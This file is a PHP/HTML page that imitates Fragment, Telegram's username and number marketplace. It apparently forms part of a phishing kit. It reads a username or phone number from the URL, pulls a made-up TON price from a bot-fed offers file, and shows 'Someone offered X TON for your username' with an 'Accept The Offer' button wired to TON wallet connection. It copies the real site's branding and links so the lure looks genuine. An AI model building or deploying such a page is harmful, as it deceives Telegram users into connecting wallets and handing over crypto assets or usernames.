<?php
$username = isset($_GET['username']) && !empty($_GET['username']) ? htmlspecialchars($_GET['username']) : null;
$number   = isset($_GET['number']) && !empty($_GET['number']) ? preg_replace('/\D/', '', $_GET['number']) : null;

if (!$username && !$number) {
    header("Location: https://fragment.com/");
    exit();
}

function formatTonPrice($price) {
    if (!is_numeric($price)) {
        return $price;
    }

    $floatVal = (float)$price;

    if (fmod($floatVal, 1) !== 0.0) {
        return number_format($floatVal, 2, '.', ',');
    }

    if ($floatVal >= 1000) {
        return number_format($floatVal, 0, '.', ',');
    }

    return (string)$price;
}

if ($number) {
    $number = substr($number, 0, 11);
    $numberFormatted = '+' . preg_replace('/^(\d{3})(\d{4})(\d{4})$/', '$1 $2 $3', $number);
}

$offersPath = __DIR__ . '/telegram-bot/offers.json';
if (!file_exists($offersPath)) {
    header("Location: https://fragment.com/");
    exit();
}

$offers = json_decode(file_get_contents($offersPath), true);

$searchKey = $username ?? $number;
if (isset($offers[$searchKey])) {
    $tonPrice = $offers[$searchKey];
    $tonPriceFormatted = formatTonPrice($tonPrice);
} elseif (isset($numberFormatted) && isset($offers[$numberFormatted])) {
    $tonPrice = $offers[$numberFormatted];
    $tonPriceFormatted = formatTonPrice($tonPrice);
} else {
    header("Location: https://fragment.com/");
    exit();
}
?>

<!DOCTYPE html>
<html
    style="--tg-color-scheme: dark; --tg-theme-bg-color: #212121; --tg-theme-text-color: #ffffff; --tg-theme-hint-color: #aaaaaa; --tg-theme-link-color: #8774e1; --tg-theme-button-color: #8774e1; --tg-theme-button-text-color: #ffffff; --tg-theme-secondary-bg-color: #0f0f0f; --tg-theme-header-bg-color: #212121; --tg-theme-accent-text-color: #8774e1; --tg-theme-section-bg-color: #212121; --tg-theme-section-header-text-color: #aaaaaa; --tg-theme-subtitle-text-color: #aaaaaa; --tg-theme-destructive-text-color: #e53935; --tg-viewport-height: 100vh; --tg-viewport-stable-height: 100vh;">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Fragment</title>
    <meta name="viewport"
        content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="MobileOptimized" content="176">
    <meta name="HandheldFriendly" content="True">
    <meta property="og:site_name" content="Fragment Auctions">
    <link rel="shortcut icon" href="/fragment.ico" type="image/x-icon">
    <link rel="mask-icon" href="/assets/favicons/fragment_icon.svg" color="#121519">
    <link href="/assets/css/font-roboto.css@1.css" rel="stylesheet" type="text/css">
    <link href="/assets/css/bootstrap.min.css@3.css" rel="stylesheet">
    <link href="/assets/css/bootstrap-extra.css@2.css" rel="stylesheet">
    <link href="/assets/css/auction.css@75.css" rel="stylesheet">
</head>
<body class="emoji_image no-transition tc-using-mouse" style="top: auto;" ontouchstart="">
    <svg xmlns="http://www.w3.org/2000/svg" style="position:absolute;width:0;height:0;left:-10000px">
        <defs>
            <path id="icon-premium"
                d="m8.88 13.45 2.89-5.71c.33-.66 1.14-.93 1.8-.6.25.13.46.35.59.61l2.73 5.51c.22.45.66.76 1.16.82l5.7.68c.78.09 1.33.79 1.24 1.57-.04.31-.18.61-.41.84l-4.52 4.42c-.18.18-.27.43-.23.68l.75 5.98c.1.85-.5 1.63-1.36 1.74-.32.04-.65-.02-.94-.18l-4.77-2.59c-.34-.19-.76-.19-1.11-.01l-4.93 2.52c-.7.35-1.55.07-1.91-.62-.13-.26-.18-.55-.14-.84l.4-2.74c.19-1.34 1.03-2.51 2.23-3.12l5.49-2.78c.15-.08.2-.26.13-.4-.06-.12-.18-.18-.31-.16l-6.71.95c-1.02.15-2.06-.14-2.87-.79l-2.23-1.82c-.64-.51-.73-1.45-.22-2.09.24-.29.59-.48.97-.53l5.73-.74c.36-.04.68-.27.85-.6z">
            </path>
            <path id="icon-ton-qr"
                d="m4.02 7h15.945c.33 0 .6.27.6.615 0 .105-.015.21-.075.3l-7.56 13.62c-.33.6-1.08.81-1.665.48-.21-.12-.375-.285-.48-.495l-7.305-13.62c-.15-.3-.045-.675.255-.825.09-.045.18-.075.285-.075zm7.98 14.67v-14.67z"
                fill="none" stroke="currentColor" stroke-width="2.1"></path>

            <path
                d="M 6.67 5.74 L 8.88 1.32 C 9.13 0.81 9.74 0.6 10.25 0.86 C 10.45 0.96 10.61 1.13 10.71 1.33 L 12.79 5.59 C 12.96 5.93 13.29 6.17 13.67 6.22 L 18.03 6.74 C 18.62 6.82 19.05 7.36 18.98 7.96 C 18.95 8.2 18.84 8.43 18.66 8.61 L 15.21 12.03 C 15.07 12.16 15.01 12.36 15.03 12.56 L 15.6 17.17 C 15.69 17.83 15.22 18.44 14.57 18.52 C 14.32 18.55 14.07 18.5 13.85 18.38 L 10.21 16.38 C 9.95 16.24 9.63 16.23 9.36 16.37 L 5.59 18.32 C 5.06 18.59 4.41 18.38 4.14 17.84 C 4.03 17.64 4 17.41 4.03 17.19 L 4.33 15.07 C 4.48 14.03 5.12 13.14 6.04 12.66 L 10.23 10.51 C 10.34 10.45 10.38 10.31 10.33 10.2 C 10.28 10.11 10.19 10.06 10.09 10.08 L 4.97 10.82 C 4.19 10.93 3.39 10.71 2.78 10.2 L 1.07 8.8 C 0.58 8.4 0.51 7.68 0.9 7.18 C 1.09 6.96 1.35 6.81 1.64 6.77 L 6.02 6.2 C 6.3 6.17 6.54 5.99 6.67 5.74 Z"
                id="icon-star"></path>
            <lineargradient x1="25%" y1="0.825%" x2="74.92%" y2="107.86%" id="s2">
                <stop stop-color="#FFD951" offset="0%"></stop>
                <stop stop-color="#FFB222" offset="100%"></stop>
            </lineargradient>
            <lineargradient x1="50%" y1="0%" x2="50%" y2="99.8%" id="s3">
                <stop stop-color="#E58F0D" offset="0%"></stop>
                <stop stop-color="#EB7915" offset="100%"></stop>
            </lineargradient>
            <filter x="-5.2%" y="-5.3%" width="110.3%" height="110.6%" filterUnits="objectBoundingBox" id="s4">
                <feoffset dx="1" dy="1" in="SourceAlpha" result="shadowOffsetInner1"></feoffset>
                <fecomposite in="shadowOffsetInner1" in2="SourceAlpha" operator="arithmetic" k2="-1" k3="1"
                    result="shadowInnerInner1"></fecomposite>
                <fecolormatrix values="0 0 0 0 1 0 0 0 0 1 0 0 0 0 1 0 0 0 0.657 0" type="matrix"
                    in="shadowInnerInner1"></fecolormatrix>
            </filter>
            <g id="icon-colorful-star" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                <use fill="url(#s2)" fill-rule="evenodd" xlink:href="#icon-star"></use>
                <use fill="#000" filter="url(#s4)" xlink:href="#icon-star"></use>
                <use stroke="url(#s3)" stroke-width="0.89" xlink:href="#icon-star"></use>
            </g>
            <g id="icon-multi-star" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                <use stroke="currentColor" stroke-width="2.67" xlink:href="#icon-star"></use>
                <use fill="url(#s2)" fill-rule="evenodd" xlink:href="#icon-star"></use>
                <use fill="#000" filter="url(#s4)" xlink:href="#icon-star"></use>
                <use stroke="url(#s3)" stroke-width="0.89" xlink:href="#icon-star"></use>
                <path d="M 4 19 L 14 19 L 9 16.5 L 4 19 Z" fill="currentColor"></path>
            </g>
        </defs>
    </svg>
    <div id="aj_content">
        <header class="tm-header">
            <div class="tm-header-logo">
                <a href="#!" class="tm-logo js-header-logo js-logo js-random-logo js-logo-hoverable">
                    <i class="tm-logo-icon js-logo-icon"></i>
                    <i class="tm-logo-text"></i>
                </a>
            </div>
            <div class="tm-header-body">
                <div class="tm-header-search-form">
                    <div class="icon-before icon-search tm-field tm-search-field">
                        <input type="search" class="form-control tm-input tm-search-input" name="query"
                            placeholder="Search..." autocomplete="off">
                    </div>
                </div>
            </div>
            <div class="tm-header-menu hide js-header-menu" data-close-outside="js-header-menu-window">
                <div class="tm-header-menu-close-button js-header-menu-close-button icon-before icon-header-menu-close">
                </div>
                <div class="tm-header-menu-window js-header-menu-window">
                    <div class="tm-header-menu-body">
                        <h4 class="tm-menu-subheader">Platform</h4>
                        <div class="tm-menu-links">
                            <a href="https://fragment.com/about"
                                class="tm-menu-link icon-before icon-menu-about">About</a>
                            <a href="https://fragment.com/terms"
                                class="tm-menu-link icon-before icon-menu-terms">Terms</a>
                            <a href="https://fragment.com/privacy"
                                class="tm-menu-link icon-before icon-menu-privacy">Privacy Policy</a>
                        </div>
                        <div class="tm-header-menu-footer">
                            <div class="tm-header-menu-footer-text">
                                Connect TON and Telegram <br>to view your bids and assets
                            </div>
                            <button class="btn btn-primary btn-block tm-menu-button ton-auth-link">
                                <i class="icon icon-connect-ton"></i>
                                <span class="tm-button-label">Connect TON</span>
                            </button>
                            <button class="btn btn-default btn-block tm-menu-button login-link">
                                <i class="icon icon-connect-telegram"></i>
                                <span class="tm-button-label">Connect Telegram</span>
                            </button>
                        </div>
                    </div>
                </div>
            </div>
        </header>
        <main class="tm-main js-main-content">
            <section class="tm-section tm-auction-section">
                <div class="tm-section-header">
                    <h2 class="tm-section-header-text">
                        <span class="tm-section-header-domain">
                            <span class="tm-web3-address">
                                <?php if ($username): ?>
                                <span class="subdomain admin-nickname" id="username">
                                    <?php echo $username; ?>
                                </span>
                                <span class="domain">.t.me</span>
                                <?php endif; ?>

                                <?php if ($number): ?>
                                <span class="subdomain admin-nickname" id="username">
                                    <?php echo $numberFormatted; ?>
                                </span>
                                <?php endif; ?>
                            </span>
                        </span>
                        <span class="tm-section-header-status tm-status-avail">Deal In Progress</span>
                    </h2>
                    <div class="tm-section-subscribe tm-section-box js-subscribe">
                    </div>
                </div>
                <div class="tm-section-box tm-section-bid-info">
                    <table class="table tm-table tm-table-fixed">
                        <thead>
                            <tr>
                                <th style="--width:100%;">What is this?</th>
                            </tr>
                        </thead>
                        <tbody>
                            <tr>
                                <td>
                                    <div class="table-cell">
                                        <div class="table-cell-desc" style="text-align: left; font-size: 12px;">
                                            Someone offered <span class="ton-price icon-before icon-ton"
                                                style="padding-left: 5px;"><?php echo $tonPriceFormatted; ?></span> for
                                            your 
                                            <?php if ($username): ?>
                                            <span id="order-type">username</span>. If the price suits you, press
                                            <?php endif; ?>
                                            <?php if ($number): ?>
                                            <span id="order-type">number</span>. If the price suits you, press
                                            <?php endif; ?>
                                            "Accept
                                            The Offer" button.
                                        </div>
                                    </div>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                    <div class="tm-bid-info-text"><a href="https://fragment.com/about" class="js-howitworks">How does
                            this work?</a></div>
                </div>
                <?php if ($number): ?>
                <div class="tm-list tm-section-box tm-section-auction-info">
                    <dl class="tm-list-item" style="background-color: var(--table-header-bg-color)">
                    <dt class="tm-list-item-title">Anonymous Number</dt>
                    <dd class="tm-list-item-value">
                        <span class="accent-color"><?php echo $numberFormatted; ?></span>
                    </dd>
                    </dl>
                    <div class="tm-list-item-hint">
                    This anonymous number can be used to create a Telegram account not tied to a SIM card.
                    </div>
                    <a href="https://fragment.com/about" style="padding: 0 16px 8px; font-size: 13px;">Learn more</a>
                </div>
                <?php endif; ?>

                <?php if ($username): ?>
                <div class="tm-list tm-section-box tm-section-auction-info">
                    <dl class="tm-list-item">
                        <dt class="tm-list-item-title">Telegram Username</dt>
                        <dd class="tm-list-item-value">
                            <span class="accent-color" id="nick">@<span class="admin-nickname"><?php echo $username; ?></span></span>
                        </dd>
                    </dl>
                    <dl class="tm-list-item">
                        <dt class="tm-list-item-title">Web Address</dt>
                        <dd class="tm-list-item-value">
                            <span class="accent-color" id="web">t.me/<span
                                    class="admin-nickname"><?php echo $username; ?></span></span>
                        </dd>
                    </dl>
                    <dl class="tm-list-item">
                        <dt class="tm-list-item-title">TON Web 3.0 Address</dt>
                        <dd class="tm-list-item-value">
                            <span class="accent-color">
                                <span class="tm-web3-address">
                                    <span class="subdomain admin-nickname" id="tonweb"><?php echo $username; ?></span>
                                    <span class="domain">.t.me</span>
                                </span>
                            </span>
                        </dd>
                    </dl>
                </div>
                <?php endif; ?>
                <div class="tm-section-box tm-section-buttons">
                    <button class="btn btn-primary js-place-bid-btn ton-connect-trigger interact-button"
                        data-bid-amount="7" id="startbtn">Accept The Offer</button>
                </div>
                <div class="tm-section-subscribe tm-section-box js-subscribe">
                    <a class="btn-link subscribe-btn js-subscribe-btn">Subscribe to updates</a>
                    <a class="btn-link unsubscribe-btn js-unsubscribe-btn">Unsubscribe from updates</a>
                </div>
            </section>
            <section class="tm-section clearfix">
                <div class="tm-section-header">
                    <h3 class="tm-section-header-text">Deal Info</h3>
                </div>
                <div class="tm-table-wrap">
                    <table class="table tm-table tm-table-fixed">
                        <thead>
                            <tr>
                                <th style="--thin-width:100px;--wide-width:25%">Price</th>
                                <th style="--thin-width:110px;--wide-width:25%">TON - Username</th>
                                <th style="--width:50%">Recipient</th>
                            </tr>
                        </thead>
                        <tfoot>
                        </tfoot>
                        <tbody>
                            <tr>
                                <td>
                                    <div class="table-cell">
                                        <div class="table-cell-value tm-value icon-before icon-ton"><?php echo $tonPriceFormatted; ?></div>
                                    </div>
                                </td>
                                <td>
                                    <div class="table-cell">
                                        <div class="tm-datetime"><span class="thin-only"><time
                                                    datetime="2024-08-14T18:49:23+00:00"
                                                    class="short">Swappable</time></span><span class="wide-only"><time
                                                    datetime="2024-08-14T18:49:23+00:00">Swappable</time></span></div>
                                    </div>
                                </td>
                                <td>
                                    <div class="table-cell">
                                        <a href="https://tonviewer.com/Ef_BbsF16B4aReCFhXIOLh7qgIdLTClPvKU29ZWwLShisZ6P"
                                            class="tm-wallet" target="_blank"><span
                                                class="short">Uf_BbsF16B4aReCFhXIOLh7qgIdLTClPvKU29ZWwLShiscNK</span></a>
                                    </div>
                                </td>
                            </tr>
                            <tr>
                            </tr>
                        </tbody>
                    </table>
                </div>
        </main>
        <footer class="tm-footer">
            <div class="tm-footer-links">
                <a href="https://fragment.com/" class="tm-footer-link">Top Auctions</a>
                <a href="https://fragment.com/about" class="tm-footer-link">About</a>
                <a href="https://fragment.com/terms" class="tm-footer-link">Terms</a>
                <a href="https://fragment.com/privacy" class="tm-footer-link">Privacy</a>
            </div>
        </footer>
    </div>
</body>
</html>